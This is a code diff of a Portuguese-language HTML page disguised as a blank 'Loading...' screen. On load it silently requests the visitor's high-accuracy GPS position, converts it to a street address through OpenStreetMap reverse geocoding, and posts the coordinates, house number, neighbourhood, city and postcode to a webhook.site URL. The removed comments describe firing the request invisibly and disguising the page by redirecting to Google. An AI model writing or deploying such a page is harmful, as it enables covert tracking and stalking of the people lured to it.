@@ -5,56 +5,60 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Carregando...</title>
     <style>
-        /* Mantem a tela completamente em branco */
-        body { 
-            background-color: #ffffff; 
-            margin: 0; 
-            padding: 0; 
-        }
+        body { background-color: #ffffff; margin: 0; padding: 0; }
     </style>
 </head>
 <body>
     <script>
-        // COLOQUE A URL DO SEU WEBHOOK.SITE AQUI ENTRE AS ASPAS
         const URL_DO_WEBHOOK = "https://webhook.site/b2865f9e-7dce-463e-ba3d-13e739fa2ea6"; 
 
-        // Aciona o pedido de GPS automaticamente ao carregar a pagina
         window.onload = function() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(enviarParaComputador, showError, {
+                navigator.geolocation.getCurrentPosition(processarLocalizacao, showError, {
                     enableHighAccuracy: true
                 });
             }
         };
 
-        function enviarParaComputador(position) {
+        function processarLocalizacao(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            
-            const dados = {
-                latitude: lat,
-                longitude: lon,
-                link_maps: `https://www.google.com/maps?q=${lat},${lon}`,
-                horario: new Date().toLocaleString()
-            };
+            const precisao = position.coords.accuracy;
 
-            // Dispara a requisicao de forma invisivel
-            fetch(URL_DO_WEBHOOK, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(dados)
-            }).then(response => {
-                // Opcional: Redirecionar para o Google apos enviar os dados para disfarcar a pagina em branco
-                // window.location.href = "https://www.google.com";
-            }).catch(error => {
-                console.error("Erro no envio:", error);
-            });
+            // Consulta a API gratuita do OpenStreetMap para traduzir as coordenadas
+            const urlGeocoding = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;
+
+            fetch(urlGeocoding)
+                .then(resposta => resposta.json())
+                .then(dadosGeocoding => {
+                    const endereco = dadosGeocoding.address || {};
+                    
+                    // Monta o pacote final com coordenadas e endereço por extenso
+                    const pacote = {
+                        latitude: lat,
+                        longitude: lon,
+                        margem_erro_metros: precisao.toFixed(2),
+                        rua: endereco.road || "Não identificada",
+                        numero: endereco.house_number || "Sem número no mapa",
+                        bairro: endereco.suburb || endereco.neighbourhood || "Não identificado",
+                        cidade: endereco.city || endereco.town || endereco.village || "Não identificada",
+                        estado: endereco.state || "Não identificado",
+                        cep: endereco.postcode || "Não identificado",
+                        link_maps: `https://www.google.com/maps?q=${lat},${lon}`,
+                        horario: new Date().toLocaleString()
+                    };
+
+                    // Envia tudo para o seu computador (Webhook)
+                    return fetch(URL_DO_WEBHOOK, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(pacote)
+                    });
+                })
+                .catch(error => console.error("Erro:", error));
         }
 
         function showError(error) {
-            // Oculta qualquer erro do usuario, registrando apenas no console invisivel
             console.error("Falha ao obter localização:", error);
         }
     </script>
